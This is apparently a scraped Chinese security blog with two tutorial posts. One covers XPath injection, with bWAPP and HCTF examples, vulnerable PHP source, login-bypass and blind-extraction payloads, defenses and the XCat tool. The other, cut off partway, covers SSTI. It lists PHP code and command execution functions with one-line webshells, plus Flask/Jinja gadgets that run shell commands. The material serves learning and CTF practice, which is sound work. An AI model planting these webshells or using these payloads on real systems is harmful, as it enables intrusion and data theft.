xpath之bwapp实例一\n我们来看看bwapp上的第一个xpath注入\n\n这个登录界面访问权限是通过xpath去读取xml文件来实现的。换句话说，你输入账号密码，他就把xml文件里的合法账号密码拿出来和你填写的进行比对，如果一致就通过。如果他对输入没有进行过滤的话用sql注入的万能钥匙是能通过的！\n\n通过这个我们了解到，xpath和sql注入还是有点像的，起码or能用。\n进阶探索\n看一道xpath注入的ctf题目：\n\n在cookie中找到提示信息:意思是sqli不是唯一的注入-&gt;因此我们想到Xpath注入\n\n\n用 user1’ or ‘’=’这样爆出所有user查询结果，并不能找到flag，看来只能拿出xpath特有的注入手段了（这也是和sql注入最大的区分）直接看exp：xmltest.php?user=user1’] | //* | //*[’\n\n好了，这一部分只需要了解xpath注入和sql注入不是一个东西就行。\n0x10 XPath之bwapp实例二\n再来看看bwapp的第二个xpath注入\n\n这个web应用是，你给出类型，他查找这个类型的电影，给你呈现出来。这里我选了action动作片，他告诉我图中结果。看url就知道，这里是通过get来传参的。简单测试下：\n\n语句：genre=action’ and  ‘’=‘&amp;action=search没有回显，（正常应该有回显）看样子是接收参数的位置问题，不是任何位置都可以接受and  or（比如在函数里）那我们试试：genre=action’ | //* | ’ &amp;action=search\n\n继续：genre=action’] | //* | //*[’ &amp;action=search\n还是不行，不要灰心，拼字游戏就是如此。\n我们来看看一个查询语句：//peo[@name=‘{$user}’]/subject[contains(foo, ‘chinese’)]/score\n这是之前查分数的XPath，这里接收参数的位置是在中括号里面，用来挑选某个节点属性，因此用中括号闭合成功，这里不行会不会是哪个函数里面接收参数？那就是括号！\n\n把中括号换成圆括号也不行。就在我郁闷的时候，一拍脑袋，函数一般是放在中括号里，用来增加查询条件的，这有点像where\n那么试试：genre=action’)] | //* | //*[(’ &amp;action=search\n这里对这个payload的理解: 第一个|前面啥也查不到,因此转到中间的语句,返回//*  (文档中所有元素),接着又查询第三个,虽然search查不到,但前面有   //*  即://*[(‘’)]/movie,返回文档中所有movie元素\n\n0x11 xpath挖掘利用\n如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作。\nXpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置。\n判断依据：主要根据错误信息页面判断以及查看源码进行分析。\n\nExample：Bwapp\n首先这是这个Get方式请求验证，因此对get的参数进行注入测试，发现报错信息，说明是可能通过xml存储于前端交互。\n\n然后构造xpath查询语句//users/user[loginID/text()=‘’ and password/text()=‘’],因此’or 1=1 or ‘’=‘或者’ or ‘1’='1等使其为真可以。\n\nExample:hctf\nindex.html\n&lt;?php$re = array(&#x27;and&#x27;,&#x27;or&#x27;,&#x27;count&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;union&#x27;,&#x27;group&#x27;,&#x27;by&#x27;,&#x27;limit&#x27;,&#x27;insert&#x27;,&#x27;where&#x27;,&#x27;order&#x27;,&#x27;alter&#x27;,&#x27;delete&#x27;,&#x27;having&#x27;,&#x27;max&#x27;,&#x27;min&#x27;,&#x27;avg&#x27;,&#x27;sum&#x27;,&#x27;sqrt&#x27;,&#x27;rand&#x27;,&#x27;concat&#x27;,&#x27;sleep&#x27;);setcookie(&#x27;injection&#x27;,&#x27;c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=&#x27;,time()+100000);if(file_exists(&#x27;t3stt3st.xml&#x27;)) &#123;  $xml = simplexml_load_file(&#x27;t3stt3st.xml&#x27;);  $user=$_GET[&#x27;user&#x27;];  $user=str_replace($re, &#x27; &#x27;, $user); // $user=str_replace(&quot;&#x27;&quot;, &quot;&amp;apos&quot;, $user);   $query=&quot;user/username[@name=&#x27;&quot;.$user.&quot;&#x27;]&quot;;   $ans = $xml-&gt;xpath($query); foreach($ans as $x =&gt; $x_value) &#123;   echo $x.&quot;: &quot; . $x_value;   echo &quot;&lt;br /&gt;&quot;;  &#125; &#125; ?&gt;\nt3stt3et.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;root1&gt;  &lt;user&gt;  &lt;username name=&#x27;user1&#x27;&gt;user1&lt;/username&gt;  &lt;key&gt;KEY:1&lt;/key&gt;  &lt;username name=&#x27;user2&#x27;&gt;user2&lt;/username&gt;  &lt;key&gt;KEY:2&lt;/key&gt;  &lt;username name=&#x27;user3&#x27;&gt;user3&lt;/username&gt;  &lt;key&gt;KEY:3&lt;/key&gt;  &lt;username name=&#x27;user4&#x27;&gt;user4&lt;/username&gt;  &lt;key&gt;KEY:4&lt;/key&gt;  &lt;username name=&#x27;user5&#x27;&gt;user5&lt;/username&gt;  &lt;key&gt;KEY:5&lt;/key&gt;  &lt;username name=&#x27;user6&#x27;&gt;user6&lt;/username&gt;  &lt;key&gt;KEY:6&lt;/key&gt;  &lt;username name=&#x27;user7&#x27;&gt;user7&lt;/username&gt;  &lt;key&gt;KEY:7&lt;/key&gt;  &lt;username name=&#x27;user8&#x27;&gt;user8&lt;/username&gt;  &lt;key&gt;KEY:8&lt;/key&gt;  &lt;username name=&#x27;user9&#x27;&gt;user9&lt;/username&gt;  &lt;key&gt;KEY:9&lt;/key&gt;  &lt;/user&gt;  &lt;hctfadmin&gt;  &lt;username name=&#x27;hctf1&#x27;&gt;hctf&lt;/username&gt;  &lt;key&gt;flag:hctf&#123;Dd0g_fac3_t0_k3yboard233&#125;&lt;/key&gt;  &lt;/hctfadmin&gt; &lt;/root1&gt;\n通过查看源码$query，然后构造payload: ']|//*|['    回显出flag\n0x12浅谈XPath注入检测思路和方法\nXML不是保存企业数据的，但是很多情况下都用来保存应用程序配置数据，小型应用程序也保存简单信息，例如角色权限等等,下面给出一个XML的列子\n&lt;addressBooke&gt;  &lt;address&gt;   &lt;name&gt;Tom&lt;/name&gt;   &lt;password&gt;abcdefg&lt;/password&gt;   &lt;age&gt;20&lt;/age&gt;   &lt;phone&gt;13000000000&lt;/phone&gt; &lt;/address&gt; &lt;address&gt;   &lt;name&gt;Bob&lt;/name&gt;   &lt;password&gt;abcdefg&lt;/password&gt;   &lt;age&gt;30&lt;/age&gt;   &lt;phone&gt;13000000001&lt;/phone&gt; &lt;/address&gt; &lt;address&gt;   &lt;name&gt;Jack&lt;/name&gt;   &lt;password&gt;abcdefg&lt;/password&gt;   &lt;age&gt;40&lt;/age&gt;   &lt;phone&gt;13000000002&lt;/phone&gt; &lt;/address&gt;\n原理类似SQL注入，构建新的查询逻辑来进行攻击,但是要注意，关键词像函数这种的区分大小写\n1.构建新的逻辑实现注入\nor 1=1and 1=2&#x27;or &#x27;a&#x27;=&#x27;a&#x27;and &#x27;a&#x27;=&#x27;b\n一个字节一个字节的提取出信息:\n&#x27;or //address[name/text()=&#x27;Tom&#x27; and substring(password/text(),1,1)）] =&#x27;a&#x27; and &#x27;a&#x27;=&#x27;a\n返回正常则判断正确，等同于下面的查询：\n//address[name/text()=&#x27;&#x27; or //address[name/text()=&#x27;Tom&#x27; and substring(password/text(),1,1)）] =&#x27;a&#x27; ]and &#x27;a&#x27;=&#x27;a]/phone/text()\n通过查询名字的输入 却查询到了了tom的密码首位，尝试攻击每一个字符位置并测试每一个可能的值，获得密码\n2.当然了大部分情况下，我们不能够知道任何节点的名称或者说只能知道一部分，可使用盲注XPath\n相当于SQL盲注（大家都对语句嫩熟于心，不多提了）\n首先提取父节点的名字：\n&#x27;or substring(name(parent::*[position()=1]),1,1)=&#x27;a  正常&#x27;or substring(name(parent::*[position()=1]),2,1)=&#x27;d  正常 ........\n父节点名字为address 是元素节点\n提取子节点名字\n&#x27;or substring(//address[1]/*[2],1,1)=&#x27;p&#x27; or &#x27;a&#x27;=&#x27;a 正常&#x27;or substring(//address[1]/*[2],2,1)=&#x27;a&#x27; or &#x27;a&#x27;=&#x27;a 正常........\n二号子节点名称为password\n提取子节点的值：\n基于原理：//address[1]/*[2]/text() -&gt; tom的password 但是这个不会输出\n我们通过布尔型来查询XML所有的内容\n&#x27;or substring(//address[1]/*[2]/text(),1,1)=&#x27;a&#x27; or&#x27;a&#x27;=&#x27;a 正常&#x27;or substring(//address[1]/*[2]/text(),1,1)=&#x27;b&#x27; or&#x27;a&#x27;=&#x27;a 正常......\n第二个子节点值为abcdefg\n测试步骤：\n提交这些看能否使得状态改变 （count返回子节点数量）\n&#x27; or count(parent::*[position()=1])=0 or &#x27;a&#x27;=&#x27;b 状态1&#x27; or count(aprent::*[position()=1])&gt;0 or &#x27;a&#x27;=&#x27;b 状态改变\n数字型参数：\n1 or count(parent::*[position()=1])=01 or count(parent::*[position()=1])=0 状态改变\n确定了存在注入点，用上面的方法注入就可以了！\n0x13 经典xpath源码\nindex.php：\n&lt;?php $re = array(&#x27;and&#x27;,&#x27;or&#x27;,&#x27;count&#x27;,&#x27;select&#x27;,&#x27;from&#x27;,&#x27;union&#x27;,&#x27;group&#x27;,&#x27;by&#x27;,&#x27;limit&#x27;,&#x27;insert&#x27;,&#x27;where&#x27;,&#x27;order&#x27;,&#x27;alter&#x27;,&#x27;delete&#x27;,&#x27;having&#x27;,&#x27;max&#x27;,&#x27;min&#x27;,&#x27;avg&#x27;,&#x27;sum&#x27;,&#x27;sqrt&#x27;,&#x27;rand&#x27;,&#x27;concat&#x27;,&#x27;sleep&#x27;); setcookie(&#x27;injection&#x27;,&#x27;c3FsaSBpcyBub3QgdGhlIG9ubHkgd2F5IGZvciBpbmplY3Rpb24=&#x27;,time()+100000); if(file_exists(&#x27;t3stt3st.xml&#x27;)) &#123;     $xml = simplexml_load_file(&#x27;t3stt3st.xml&#x27;);     $user=$_GET[&#x27;user&#x27;];     $user=str_replace($re, &#x27; &#x27;, $user);   //  $user=str_replace(&quot;&#x27;&quot;, &quot;&amp;apos&quot;, $user);     $query=&quot;user/username[@name=&#x27;&quot;.$user.&quot;&#x27;]&quot;;        $ans = $xml-&gt;xpath($query);     foreach($ans as $x =&gt; $x_value)     &#123;         echo $x.&quot;:  &quot; . $x_value;         echo &quot;&lt;br /&gt;&quot;;     &#125; &#125; ?&gt;  \n//t3stt3st.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;root1&gt;     &lt;user&gt;         &lt;username name=&#x27;user1&#x27;&gt;user1&lt;/username&gt;         &lt;key&gt;KEY:1&lt;/key&gt;         &lt;username name=&#x27;user2&#x27;&gt;user2&lt;/username&gt;         &lt;key&gt;KEY:2&lt;/key&gt;         &lt;username name=&#x27;user3&#x27;&gt;user3&lt;/username&gt;         &lt;key&gt;KEY:3&lt;/key&gt;         &lt;username name=&#x27;user4&#x27;&gt;user4&lt;/username&gt;         &lt;key&gt;KEY:4&lt;/key&gt;         &lt;username name=&#x27;user5&#x27;&gt;user5&lt;/username&gt;         &lt;key&gt;KEY:5&lt;/key&gt;         &lt;username name=&#x27;user6&#x27;&gt;user6&lt;/username&gt;         &lt;key&gt;KEY:6&lt;/key&gt;         &lt;username name=&#x27;user7&#x27;&gt;user7&lt;/username&gt;         &lt;key&gt;KEY:7&lt;/key&gt;         &lt;username name=&#x27;user8&#x27;&gt;user8&lt;/username&gt;         &lt;key&gt;KEY:8&lt;/key&gt;         &lt;username name=&#x27;user9&#x27;&gt;user9&lt;/username&gt;         &lt;key&gt;KEY:9&lt;/key&gt;     &lt;/user&gt;     &lt;hctfadmin&gt;             &lt;username name=&#x27;hctf1&#x27;&gt;hctf&lt;/username&gt;         &lt;key&gt;flag:hctf&#123;Dd0g_fac3_t0_k3yboard233&#125;&lt;/key&gt;     &lt;/hctfadmin&gt; &lt;/root1&gt;\n从index.php源码可知XPath查询语句为$query=“user/username[@name='”.$user.“']”，  且$user经过关键字替换。但是黑名单$re中都为SQL关键字，所以并不影响对XPath进行注入。我们可以构造payload如 ']|//*|zzz['来进行注入，获取文档中的所有元素节点。\n0x14 xpath危害\n\n在URL及表单中提交恶意XPath代码，可获取到权限限制数据的访问权，并可修改这些数据；\n可通过此类漏洞查询获取到系统内部完整的XML文档内容。\n逻辑以及认证被绕过，它不像数据库那样有各种权限，xml没有各种权限的概念,正因为没有权限概念，因此利用xpath构造查询的时候整个数据库都会被用户读取。\nxpath的具体危害：\n\n下面我将从这两个方面来分别演示这两种危害。\n（1）绕过验证\n首先这里有一个登录身份验证的程序，所有的身份数据都存储在一个名为 UsersDataBase.xml 的文件里。 通过 XPath 查询 xml 文件，将用户提交的用户名和密码与 xml 文件中的用户名密码做比对来验证身份。\n\nUsersDataBase.xml 的结构如下：\n\n一般情况下，输入错误的用户名或密码会导致身份认证失败：\n\n然而在后台的身份认证程序中有这样一句 XPath 查询语句\n\n$xpath = “//users/user[username/text()='”.$_POST[“username”].“’ and password/text()='”.$_POST[“password”].“']”;\n\n可以看到在 XPath 查询语句中并未对用户的输入做任何处理，这就直接导致一个注入点\n我们可以构造如下的 payload:\n\nUsername: ’ or ‘1’ = '1\nPassword: ’ or ‘1’ = '1\n\n那么整个 XPath 查询语句就变成了这个样子\n\n$xpath = “//users/user[username/text()=‘’ or ‘1’ = ‘1’ and password/text()=‘’ or ‘1’ = ‘1’]”;\n\n整个查询语句恒成立，就直接导致了身份认证被绕过。\n\n2.信息泄露\n大多数情况下，当服务器返回数据时，都会对这些数据做一些处理。比如如果服务器返回一些错误信息，那么最终会被过滤掉，不会出现在用户的页面里。将尽可能少的信息暴露给用户，将可以提高安全性。但是即使错误信息被过滤掉，我们依然可以从服务器给出的不同返回结果推测出服务器做出了何种响应。作为攻击者可以提交一段包含 XPath 函数的 Payload，通过服务器给出的不同响应，判断得到我们想知道的信息。这就是 XPath 盲注。\n下面这是一个通过用户名的ID来得到用户名的程序。当然具体场景也可能是通过名字来查询身份证号码等等，这里只做演示。\n正常情况下，输入用户的 ID，就会得到相应的用户名。当查询语句恒成立时（如构造 Payload 为’ or ‘1’ =  '1 时），就会返回第一个节点的用户名 “Alice”（这是程序本身的 bug ）。而当查询语句错误或该 ID 在 xml 数据库中不存在时，就什么都不返回。\n\n\n利用这点，我们就可以构造如下 Payload，比如：来查询整个 xml 文档的根节点的第一个字母是否为“u”\n\n’ or substring(name(parent::*[position()=1]),1,1)='u\n\n返回结果为 “Alice”，就说明整个 xml 文档的根节点的第一个字母是 “u”，反之如果什么都没有返回，则说明根节点的第一个字母不是 “u”。以此类推，我们就可以历遍整个 xml 文档了。这也是 xml和其他数据库相比最大的威胁所在了，因为它没有访问控制和身份验证。\n0x15 xpath防御\n\n数据提交到服务器上端，在服务端正式处理这批数据之前，对提交数据的合法性进行验证。\n检查提交的数据是否包含特殊字符，对特殊字符进行编码转换或替换、删除敏感字符或字符串，如过滤[] ‘ “ and or 等全部过滤，像单双引号这类，可以对这类特殊字符进行编码转换或替换\n对于系统出现的错误信息，以IE错误编码信息替换，屏蔽系统本身的出错信息或者用统一的报错页面代替（如updataxml()这类）\n参数化XPath查询，将需要构建的XPath查询表达式，以变量的形式表示，变量不是可以执行的脚本。如下代码可以通过创建保存查询的外部文件使查询参数化：\n\n\ndeclare variable $loginID as xs：string external；\ndeclare variable $password as xs：string external；\n//users/user[@loginID=$loginID and@password= $password]\n\n通过MD5、SSL等加密算法，对于数据敏感信息和在数据传输过程中加密，即使某些非法用户通过非法手法获取数据包，看到的也是加密后的信息。\n\n验证是否包含特定的 XPath 函数，可以过滤掉一些 XPath 函数，以提高安全性，当然了不能以牺牲用户体验或影响用户正常使用为前提。\n\n总结下就是：限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量\n0x16 xpath工具\n\nXCat\n\nXCat是一个用来利用XPath盲注的命令行程序。它可以用来检索正在被易受攻击的XPath查询处理的整个XML文档，读取主机文件系统上的任意文件，并利用无限制的HTTP请求使服务器直接向xcat发送数据(OOB带外通信)\nXcat是python的命令行程序利用Xpath的注入漏洞在Web应用中检索XML文档,下载地址：https://github.com/orf/xcat\n使用说明：http://xcat.readthedocs.io/en/latest/#about-xcat\n\npython3.4.1环境:\npip install xcat\n\n常用命令读取xml文件：(这命令老了,我现在也不知道现版本咋用,有时间研究吧…)\n\nxcat.py  --method=GET --public-ip=“192.168.91.139” http://192 .168.91.139/xml/example2.php name=hacker name “Hello hacker” run  retrieve\n\nXpath注入\n","categories":["常见top漏洞"]},{"title":"浅析SSTI漏洞","url":"/2023/08/06/%E6%B5%85%E6%9E%90SSTI%E6%BC%8F%E6%B4%9E/","content":"SSTI注入姿势\n一、常见代码执行函数\n代码执行函数主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()\n1- eval()\n传入的参数必须为PHP代码，即需要以分号结尾。    命令執行：cmd=system(whoami);    菜刀连接密码：cmd &lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;\n特别注意：php中@是干什么的\n屏蔽掉出错信息,有@时就算连接出错,也不会报错的\n原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为\n2- assert()  --（最好不要加上分号作为结尾）\nassert函数是直接将传入的参数当成PHP代码，不需要以分号结尾（特别注意），有时加上分号不会显示结果。    命令執行：cmd=system(whoami)    菜刀连接密码：cmd &lt;?php @assert($_POST[&#x27;cmd&#x27;])?&gt;\n3- call_user_func()\n传入的参数作为assert函数的参数    命令执行：cmd=system(whoami)    菜刀连接密码：cmd&lt;?php call_user_func(&quot;assert&quot;,$_POST[&#x27;cmd&#x27;]); ?&gt;\n\n&lt;?phpcall_user_func($_POST[&quot;fun&quot;],$_POST[&quot;para&quot;])?&gt;//post:fun=assert&amp;para=phpinfo();\n\n4- create_function()\n创建匿名函数执行代码执行命令和上传文件参考eval函数(必须加分号)。&lt;?php $func =create_function(&#x27;&#x27;,$_POST[&#x27;cmd&#x27;]);$func(); ?&gt;\n\n&lt;?php$a= $_POST[&#x27;func&#x27;];$b = create_function(&#x27;$a&#x27;,&quot;echo $a&quot;);$b(&#x27;&#x27;);?&gt;//post:func=phpinfo();\n\n5- array_map()\narray_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。    命令执行http://localhost/123.php?func=system   cmd=whoami    菜刀连接http://localhost/123.php?func=assert   密码：cmd&lt;?php    $func=$_GET[&#x27;func&#x27;];    $cmd=$_POST[&#x27;cmd&#x27;];    $array[0]=$cmd;    $new_array=array_map($func,$array);    echo $new_array;?&gt;\n\n6- call_user_func_array()\n将传入的参数作为数组的第一个值传递给assert函数    cmd=system(whoami)    菜刀连接密码：cmd&lt;?php    $cmd=$_POST[&#x27;cmd&#x27;];    $array[0]=$cmd;    call_user_func_array(&quot;assert&quot;,$array);?&gt;\n\n7- array_filter()\n用回调函数过滤数组中的元素：array_filter(数组,函数)    命令执行func=system&amp;cmd=whoami    菜刀连接http://localhost/123.php?func=assert  密码cmd&lt;?php    $cmd=$_POST[&#x27;cmd&#x27;];    $array1=array($cmd);    $func =$_GET[&#x27;func&#x27;];    array_filter($array1,$func);?&gt;\n\n8- uasort()函数\nphp环境&gt;=&lt;5.6才能用uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。    命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);    菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd])   密码：cmd&lt;?php    usort($_GET,&#x27;asse&#x27;.&#x27;rt&#x27;);?&gt;\n\n9- preg_replace()\npreg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)执行命令和上传文件参考assert函数(不需要加分号)。将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。&lt;?php    preg_replace(&quot;/test/e&quot;,$_POST[&quot;cmd&quot;],&quot;jutst test&quot;);?&gt;这里可以使用chr()函数转换ASCII编码来执行代码。 #phpinfo();eval(chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111).chr(40).chr(41).chr(59))\n\n二、常见命令执行函数\n*命令执行函数主要有（7个）：system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``\n1- system()\n    作用    将字符串作为OS命令执行，自带输出功能。&lt;?php system($_POST[&quot;cmd&quot;]);?&gt; \n2-passthru()\n    作用    将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。&lt;?php passthru($_POST[&quot;cmd&quot;]);?&gt; \n3- exec()\n    作用    将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。&lt;?php echo exec($_POST[&quot;cmd&quot;]);?&gt; &lt;?php print exec($_POST[&quot;cmd&quot;]);?&gt;    //他的输出结果需要打印，system()不用打印\n4- pcntl_exec()\nlinux: &lt;?php pcntl_exec(&quot;/bin/bash&quot;,array($_POST[&quot;cmd&quot;])); ?&gt;用的不多。暂时略过。\n5- shell_exec()\n    作用    将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。&lt;?php echo shell_exec($_POST[&quot;cmd&quot;]); ?&gt;&lt;?php print shell_exec($_POST[&quot;cmd&quot;]); ?&gt;\n6- popen()/proc_open()\n    作用    该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数。linux: &lt;?php $handle = popen(&quot;/bin/ls&quot;,&quot;r&quot;);?&gt;windows:&lt;?php\t$cmd = $_POST[&#x27;cmd&#x27;].&quot;&gt;&gt; 1.txt&quot;;\t//此时的$cmd=ipconfig &gt;&gt; 1.txt\tpopen(&quot;$cmd&quot;,&#x27;r&#x27;); //实际上就是 popen(&quot;ipconfig &gt;&gt; 1.txt&quot;, &quot;r&quot;),把执行结果放入1.txt文件，通过访问1.txt文件查看执行结果。 ?&gt;\n7- 反引号 ``\n    作用    [``]反引号里面的代码也会被当作OS命令来执行&lt;?php echo `whoami`?&gt;或者：&lt;?php $cmd = $_GET[&#x27;cmd&#x27;];print `$cmd`; ?&gt;\n详解查看https://blog.csdn.net/weixin_39934520/article/details/109231480?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=popen是干什么的&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-109231480.nonecase&amp;spm=1018.2226.3001.4187\n三、注入流程以及必要函数的用法\n变量块 &#123;&#123;&#125;&#125;\t用于将表达式打印到模板输出注释块 &#123;##&#125;\t注释控制块\t&#123;%%&#125;\t可以声明变量，也可以执行语句行声明\t##\t\t可以有和&#123;%%&#125;相同的效果\n__class__            类的一个内置属性，表示实例对象的类。__base__             类型对象的直接基类__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.__init__             初始化类，返回的类型是function__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;current_app          应用上下文，一个全局变量。request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\\self\\fd/3&#x27;).read()request.args.x1   \t get传参request.values.x1 \t 所有参数request.cookies      cookies参数request.headers      请求头参数request.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data  \t\t post传参\t(Content-Type:a/b)request.json\t\t post传json  (Content-Type: application/json)config               当前application的所有配置。此外，也可以这样&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;\nint()\t\t将值转换为int类型；float()\t\t将值转换为float类型；lower()\t\t将字符串转换为小写；upper()\t\t将字符串转换为大写；title()\t\t把值中的每个单词的首字母都转成大写；capitalize()\t把变量值的首字母转成大写，其余字母转小写；trim()\t\t截取字符串前面和后面的空白字符；wordcount()\t计算一个长字符串中单词的个数；reverse()\t字符串反转；replace(value,old,new)\t替换将old替换为new的字符串；truncate(value,length=255,killwords=False)\t截取length长度的字符串；striptags()\t删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e\t转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()\t\t禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;；list()\t\t将变量列成列表；string()\t将变量转换成字符串；join()\t\t将一个序列中的参数值拼接成字符串。示例看上面payload；abs()\t\t返回一个数值的绝对值；first()\t\t返回一个序列的第一个元素；last()\t\t返回一个序列的最后一个元素；format(value,arags,*kwargs)\t格式化字符串。比如：&#123;&#123;&quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!length()\t返回一个序列或者字典的长度；sum()\t\t返回列表内数值的和；sort()\t\t返回排序后的列表；default(value,default_value,boolean=false)\t如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()\t返回字符串的长度，别名是count\n2.1. 初识SSTI\n1. 什么是SSTI？\nSSTI就是服务器端模板注入(Server-Side Template Injection)，实际上也是一种注入漏洞。\n可能SSTI对大家而言不是很熟悉，但是相信大家很熟悉SQL注入。实际上这两者的思路都是相同的，因此可以类比来分析。\n2. render_template渲染函数是什么\n就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。\n3. 注入的思想\n用函数不断调用我们要使用的命令：file、read、open、ls等等命令，我们用这些来读取写入配置文件；\n4. 什么是模板引擎\n是为了使 用户界面和 业务数据（内容）分离而产生的，它可以生成特定格式的文档，利用模板引擎来生成前端的HTML代码，模板引擎会提供一套生成HTML代码的程序，之后只需获取用户的数据，放入渲染函数，该数据便会嵌入生成好的HTML页面中，然后反馈给浏览器，呈现在用户面前\n\n当前的主流框架，一般都采用MVC模式，即：Model-View-Controller，用户的输入先进入Controller控制器，然后根据清流类型和请求的指令发送给对应的Model业务模型，由Model层进行业务逻辑的判断、数据库的存取等，最后把结果返回给View视图层，再经模板引擎的渲染展示给用户\n模板引擎的基本机理就是替换（转换）：将指定的标签转换为需要的业务数据；将指定的伪语句按照某种流程来变换输出\n引用一段代码来简单说一下：\n// 模板var template = &#x27;&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;&#x27;;// 用于匹配的正则/*    用于过滤出以&lt;%开头，%&gt;结尾，并且中间不包含%或&gt;的匹配项    其目的在于过滤出template中的 &lt;%name%&gt; 和 &lt;%age%&gt;*/var regex = /&lt;%([^%]+)?%&gt;/g;// 数据var data =&#123;    name:&#x27;Deutsh&#x27;,    age:22&#125;// 模板引擎var TemplateEngine = function (template,data)&#123;    // exec使用全局正则表达式意味着在循环中使用，因为它仍然会检索所有匹配的子表达式    // /regex/.exec()仅返回找到的第一个匹配项    while (match = regex.exec(template))    &#123;        template = template.replace(match[0],data[match[1]])    &#125;    return template;&#125;// 最终的执行在此处var string = TemplateEngine(template,data)console.log(string)\n上述代码，我们的目的是：将数据文件中对应的name和age替换到模板文件中\n主要的执行在模板引擎的while函数中，match = regex.exec(template)会返回一个array，这个数组中包含了多个项目\n⚠️ 为什么会包含两项呢：当正则表达式设置 g 标志位时，可以多次执行 exec 方法来查找同一个字符串中的成功匹配\n\n之后template = template.replace(match[0],data[match[1]])等同于template = template.replace(&quot;&lt;%name%&gt;&quot;,data[&quot;name&quot;])完成模板中数据的替换\n\n5. 